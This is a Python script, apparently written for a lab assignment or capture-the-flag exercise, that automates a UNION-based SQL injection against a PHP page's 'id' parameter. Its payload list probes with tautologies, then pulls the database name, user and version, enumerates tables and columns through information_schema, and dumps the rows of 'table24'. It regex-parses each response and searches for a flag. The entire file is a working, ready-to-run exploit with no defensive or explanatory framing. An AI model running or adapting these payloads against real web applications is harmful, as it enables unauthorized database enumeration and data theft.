import requests
import re
def handle_regex_result(regex_result):
	result=[]
	for item in regex_result:
		result.append(item.replace('\r','').replace('\n','').replace('\t',''))
	return result
def islastPayload(payload_list,item):
	return payload_list[len(payload_list)-1]==item
def search_flag(regex_split_result):
	for item in regex_split_result:
		if "flag" in item:
			return item
base_url="http://www.wsb.com/Assignment2/case24.php?id="
payload_list=["1","1' and '1'='1","1' and '1'='2",
"1' and 1=2 union select database(),user() --+",
"1' and 1=2 union select database(),version() --+",
"1' and 1=2 union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),version() --+",
"1' and 1=2 union select (select group_concat(column_name) from information_schema.columns where table_name='table24'),version() --+",
"1' and 1=2 union select (select group_concat(id,':',first_name,':',last_name,':') from table24),version() --+"]
for payload in payload_list:
	if islastPayload(payload_list,payload):#GET flag
		r=requests.get(base_url+payload)
		#print(r.text)
		regex_result=re.findall('<\/form>([\w\s\d\-\.@,:]*)<br/>',r.text)
		regex_result=handle_regex_result(regex_result)
		regex_result=regex_result[0].split(':')
		print("Payload:"+payload+" Result:",search_flag(regex_result))
	else:#just for other payload
		r=requests.get(base_url+payload)
		#print(r.text)
		regex_result=re.findall('<\/form>([\w\s\d\-\.@,:]*)<br/>',r.text)
		regex_result=handle_regex_result(regex_result)
		print("Payload:"+payload+" Result:",regex_result)
